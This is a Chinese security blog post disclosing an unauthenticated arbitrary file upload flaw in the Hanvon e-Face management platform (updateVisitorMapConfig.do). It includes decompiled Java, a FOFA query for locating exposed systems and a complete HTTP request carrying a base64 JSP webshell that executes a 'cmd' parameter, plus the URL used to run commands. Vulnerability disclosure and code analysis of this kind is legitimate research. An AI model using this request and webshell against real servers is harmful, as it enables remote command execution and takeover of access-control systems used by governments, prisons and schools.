---
title: "汉王e脸通综合管理平台 updateVisitorMapConfig.do 任意文件上传漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-updateVisitorMapConfig-upload-rce.html
asset_dir: assets/汉王e脸通综合管理平台-updatevisitormapconfig.do-任意文件上传漏洞
---

# 汉王e脸通综合管理平台 updateVisitorMapConfig.do 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/11 08:26
* 1306浏览
* [0评论](#comment)
* 47分钟阅读

深入探索

SQL

软件

安全


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理软件，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `updateVisitorMapConfig.do` 接口存在任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)。攻击者可在无需认证的情况下，通过向该接口上传恶意文件，实现任意文件上传，进而可能导致[远程代码执行](https://mrxn.net/tag/rce)或服务器被控制，严重威胁系统安全。

漏洞扫描服务

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

深入探索

服务器

计算机安全

文本剥离工具

直接看 `VisitorMapConfigController` 里关于 `updateVisitorMapConfig` 的实现

```
@ResponseBody
    @RequestMapping(
        value = {"/updateVisitorMapConfig.do"},
        method = {RequestMethod.POST}
    )
    public RequestJson updateVisitorMapConfig(HttpServletRequest request, @RequestBody VisitorMapTpm visitorMapTpm) {
        RequestJson result = new RequestJson();

        try {
            if (visitorMapTpm.getUpdatedPhoto() == null || visitorMapTpm.getUpdatedPhoto().isEmpty()) {
                result = RequestJson.failuerResult(result, getMessage("basics_missing_parameter"));
                return result;
            }

            this.visitorMapConfigAsm.updateVisitorMapConfig(request, visitorMapTpm);
            result = RequestJson.successResult(result, visitorMapTpm, getMessage("basics_update_success"));
        } catch (Exception e) {
            String msg = getMessage("basics_go_wrong") + e.getLocalizedMessage();
            result = RequestJson.errorResult(result, msg);
            e.printStackTrace();
        }

        return result;
    }
```

深入探索

安全研究报告

Docker加速服务

漏洞扫描器

跟进 `updateVisitorMapConfig` ，重点看下

物流软件安全

```
public void updateVisitorMapConfig(HttpServletRequest request, VisitorMapTpm visitorMapTpm) throws IOException {
    String updatedPhoto = visitorMapTpm.getUpdatedPhoto();
    String fileId = UUID.randomUUID().toString().replace("-", "");
    String fileType = visitorMapTpm.getFileType();
    String path = request.getSession().getServletContext().getRealPath("/resource");
    String savePath = path + "\\" + fileId + "." + fileType;
    GetPhoto.generateImageByBase64(updatedPhoto, savePath);
    String uploadPath = fileId + "." + fileType;
    visitorMapTpm.setUpdatedPhotoPath(uploadPath);
    visitorMapTpm.setModifyTime(DateUtils.getDate());
    this.visMapConfigDsm.updateVisitorMap(visitorMapTpm);
    if (visitorMapTpm.getVisMapSignTpmList() != null) {
        List<VisMapSignTpm> visMapSignTpmList = visitorMapTpm.getVisMapSignTpmList();
        if (visMapSignTpmList != null) {
            Long mapId = visitorMapTpm.getId();
            this.visMapSignDsm.deleteByPrimaryKey(mapId);

            for(VisMapSignTpm visMapSignTpm : visMapSignTpmList) {
                visMapSignTpm.setNgMapId(mapId);
                visMapSignTpm.setMapState(visitorMapTpm.getMapState());
                visMapSignTpm.setIdDevClass(visMapSignTpm.getId() + "@" + visMapSignTpm.getDeviceClass());
                this.visMapSignDsm.insertVisMapSignTpm(visMapSignTpm);
            }
        }
    }

}
```

用户可控 Base64 编码数据直接解码并写入用户可控路径的文件中，允许攻击者写入任意内容到系统任意位置，造成了任意文件上传漏洞。

安全运维咨询

而 `generateImageByBase64` 实现如下

```
public static boolean generateImageByBase64(String imgData, String imgFilePath) throws IOException {
    if (imgData == null) {
        return false;
    } else {
        BASE64Decoder decoder = new BASE64Decoder();
        OutputStream out = null;

        try {
            out = new FileOutputStream(imgFilePath);
            byte[] b = decoder.decodeBuffer(imgData);

            for(int i = 0; i < b.length; ++i) {
                if (b[i] < 0) {
                    b[i] = (byte)(b[i] + 256);
                }
            }

            out.write(b);
        } catch (FileNotFoundException e) {
            deleteFile(imgFilePath);
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            out.flush();
            out.close();
            return true;
        }
    }
}
```

就是解码base64数据后直接写入文件，整个过程没有文件后缀或文件内容检查、校验。

计算机服务器

整体执行流程如下

用户输入 `visitorPoliceTpm.cardId` 和 `visitorPoliceTpm.img` → 经 `trim()` 处理后，`cardId` 用于构建 `fileName` 和 `imgFilePath`，`img` 用于 `imgData` → 传递到 `GetPhoto.generateImageByBase64` 方法 → `imgData` 解码后写入文件，`imgFilePath` 用于 `FileOutputStream.write()` 调用进行文件写入操作。

# 漏洞复现

```
POST /manage/visitorMapConfig/updateVisitorMapConfig.do?recoToken=SGUsqvF7cVS HTTP/1.1
Host: hanvon.mrxn.net
Content-Type: application/json

{
  "id": 1,
  "mapName": "test",
  "fileType": "jsp",
  "updatedPhoto": "PCUgamF2YS5pby5JbnB1dFN0cmVhbSBpbiA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKS5nZXRJbnB1dFN0cmVhbSgpO2ludCBhID0gLTE7Ynl0ZVtdIGIgPSBuZXcgYnl0ZVsyMDQ4XTtvdXQucHJpbnQoIjxwcmU+Iik7d2hpbGUoKGE9aW4ucmVhZChiKSkhPS0xKXtvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIsMCxhKSk7fW91dC5wcmludCgiPC9wcmU+Iik7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPg=="
}
```

访问文件执行命令 `/manage/resource/xxxxx.jsp?cmd=whoami`

[![汉王e脸通综合管理平台 updateVisitorMapConfig.do 任意文件上传漏洞](images/img-001-ca9f05951b5a.webp)](https://image.mrxn.net/3521c08d9e56489eb2360abdffadc4aa.webp)

成功执行上传代码回显命令执行结果

漏洞扫描服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[汉王e脸通综合管理平台 updateVisitorMapConfig.do 任意文件上传漏洞](https://mrxn.net/jswz/hanvon-efacego-updateVisitorMapConfig-upload-rce.html)  
文章链接：<https://mrxn.net/jswz/hanvon-efacego-updateVisitorMapConfig-upload-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-updateVisitorMapConfig-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALgElEQVR4AeydW5bbSA5E6/b+9+xuOHxZBJQpqWx3SR/0GUwwHgBZCeq4Zc/jn4+Pjx+/Uz9+/bL3Fz1AXTyMXxfq4i/5eJYdVxftv4dmxZlVn/jVnP2z7yu8FvJf/vrXu5zAsZD/tvvxTO0eHPgADttZhzAu9MVhbynQ7nMOOmuiGUjv9CE6dDQ3+6Hn9Cfa/wjPfcdCzuJ1/boTuFkI9O1D+LOPCPfzEB+CzoVw3yZ1EeLLRfOFsM6YFaHnqndVkNzKK815jxAyBzqu+m4Wsgpd2vedwB8vpN6UVc0fAfJ2zOwuB8nr2ydf4cxAnzF7ID4Epy+H+BBUF+d91X8H/3ghv3PTq2d/An9tIZC3BzrOtwe676OZE9VFSN/kEB1u0ezE3T12uV1+p885X+F/bSFfuemV3Z/AzULc+sTdCMib2fI/6gt379Dv6p49yuuv0Kl60J9RXzQnh+QnNwfdN7dD+yau8jcLWYUu7ftO4FgIZOtwHx89GqTftwHCZ9/Oh/v5OQeSB6a15cDPb/u7Z9g2bgzIvGlDdLiP575jIWfxun7dCfzjW/JVfPTIkLfCHNzn5nwO+Fq++pyxQ8jMylaZq+sqWPvmYO1Xb5W5uv7duj4hnuKb4M1CIG8BdPR5IbpchK7v3hDzojlIPwTVZ04OycEtzoyzRP2J04fMVhdnHyQHa/xK/mYhs/ni33sC/0DfqrffvQ3qkD65aL8IyUFw5uC+PufYv0KzevKJkHtCx5mbcyD5R7np77jzz3h9Qnan9SL9WMh5S3UN/W2AcAhWpgrCIfinP0fNrHJOXVd9fHwoNYTcFzh04Of3jEP4dQHRa17VL/kGIDkIGqieKug6dF6Zc0F8CDoPwuETj4UYuvC1J3AsBLIlH8cNT77TzYmQeTMP0c2JEB2C6hPhvl957ymWdq9mTi7O3qlPDutnNDfxPP9YyFm8rl93Ajff1GG9XR8Rug/hc+ty+3ZcXXyU1xftK1TbYWWqpg/5GSCoD+EQVBchOgTV6x5VEL2uqyAcOtpXeH1C6hTeqLbfQ+YzQrZam67Sr+sqOSQHHfUrWwXx1SdCfAjqV2+VfIWQHgiagc7Vn0VY99fznAuSU4POvZ/+Ga9PiKfzJngsxC09ei7ItqHj7Jvz4H4e4u/mQHzYo73eW5y6XJw5yD2mLof49kPnMze5fSKkH/g4FvJx/XqLEzgWAtnSo6dy2xMh/erQubo47zN1OfQ59unLVwjpXXml/ZzxxN//z9zkNasK+v3MQXS5WD1V8sJjIWVc9foTOBZS26naPVJ5VZBtQ9B8eVXQdX2IDkH1ZxHSV/eoutcHz2UhOQjW3CpnQ3ToqC9WT5Ucer68Kug6hNtXeCykyFWvP4Hjmzr0bUF4bbbKR63rc0FyEJw5WOvOgPgQnPqcJxfNn1FPhMyGoPq5p66h++bEylRNDvf7YO3XrCrnFV6fkDqFN6rjm/p8ptpc1dShb7syVbtceVXTl5d3LnVRTw65P+xxZuW7WTt/6pB7qkPnzhfNTdSH9MMnXp+QeVov5k8vBLLF3XbV/Xkeccg86Gi/CN137grtWXmlQWaZEyE6d